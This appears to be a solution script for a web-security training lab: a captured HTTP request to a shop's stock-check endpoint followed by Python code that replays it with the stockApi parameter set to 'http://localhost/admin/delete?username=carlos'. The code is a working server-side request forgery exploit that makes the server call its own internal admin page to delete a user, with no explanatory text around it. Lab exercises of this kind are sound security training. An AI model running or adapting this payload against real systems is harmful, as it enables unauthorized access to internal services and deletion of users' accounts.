'''
POST /product/stock HTTP/2
Host: 0a79008204eba1fd858796e200020075.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a79008204eba1fd858796e200020075.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a79008204eba1fd858796e200020075.web-security-academy.net
Connection: keep-alive
Cookie: session=Qg3FPOzj9oq14hrAJsZMWpmubggf5r8M
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
TE: trailers

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
'''

import requests

DOMAIN = "0a79008204eba1fd858796e200020075.web-security-academy.net"
url = "https://0a79008204eba1fd858796e200020075.web-security-academy.net/product/stock"

headers = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/product?productId=1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Cookie": "session=Qg3FPOzj9oq14hrAJsZMWpmubggf5r8M",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"
}

data = {
    "stockApi": "http://localhost/admin/delete?username=carlos"
}

response = requests.post(url, headers=headers, data=data)

print(response.text)